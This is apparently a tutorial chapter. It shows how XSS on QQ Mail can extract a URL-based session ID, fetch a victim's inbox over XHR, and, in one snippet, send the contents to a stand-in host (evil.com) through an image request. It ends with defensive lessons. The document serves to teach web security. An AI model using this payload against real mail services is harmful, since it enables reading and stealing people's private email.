# 07 - XSS + Session ID Theft: Reading a Victim's Mailbox

## The Target

QQ Mail uses a session ID (`sid`) in the URL instead of (or in addition to) cookies:

```
http://m57.mail.qq.com/cgi-bin/mail_list?folderid=1&page=0&s=inbox&sid=6alhx3p5yzh9a2om7U51dDyz
```

The `sid` parameter authenticates the request — anyone with a valid `sid` can access that mailbox.

## The Attack

If the attacker achieves XSS on the QQ Mail domain, they can extract the `sid` from the URL and use it to read the victim's inbox:

```javascript
// Step 1: Extract the sid from the current page URL
if (top.window.location.href.indexOf("sid=") > 0) {
  var sid = top.window.location.href.substr(
    top.window.location.href.indexOf("sid=") + 4, 24
  );
}

// Step 2: Build the inbox URL using the stolen sid
var folder_url = "http://" + top.window.location.host +
  "/cgi-bin/mail_list?folderid=1&page=0&s=inbox&sid=" + sid;

// Step 3: Fetch the inbox contents via AJAX
var ajax = null;
if (window.XMLHttpRequest) {
  ajax = new XMLHttpRequest();
} else if (window.ActiveXObject) {
  ajax = new ActiveXObject("Microsoft.XMLHTTP");
} else {
  return;
}

ajax.open("GET", folder_url, true);
ajax.send(null);

ajax.onreadystatechange = function(){
  if (ajax.readyState == 4 && ajax.status == 200) {
    alert(ajax.responseText);
    // document.write(ajax.responseText)
  }
}
```

## Why This Works

1. The XSS runs on the same origin (`m57.mail.qq.com`), so AJAX requests to the mail server are allowed — no CORS issues
2. The `sid` is exposed in the URL, making it trivially extractable via `top.window.location.href`
3. The AJAX response contains the full inbox HTML — the attacker can read all email subjects, senders, and content

## What the Attacker Could Do Next

Instead of `alert()`, a real attack would exfiltrate the data:

```javascript
// Send the inbox contents to the attacker's server
var img = document.createElement("img");
img.src = "http://evil.com/log?data=" + encodeURIComponent(ajax.responseText);
document.body.appendChild(img);
```

Or iterate through emails by changing `page=0` to `page=1`, `page=2`, etc. to dump the entire mailbox.

## Key Lessons

- Session IDs in URLs are dangerous — they're visible in browser history, referer headers, server logs, and (as shown here) extractable via XSS
- Same-origin XSS is devastating for webmail — the attacker can read, send, and delete emails as the victim
- This is why XSS on a mail service is considered critical severity

## Defenses

- Use `HttpOnly` cookies for session management instead of URL-based `sid`
- If `sid` must be in the URL, bind it to the client's IP or fingerprint
- Strong XSS prevention (CSP, output encoding) is essential on high-value targets like webmail
- Short session expiry limits the window of exploitation
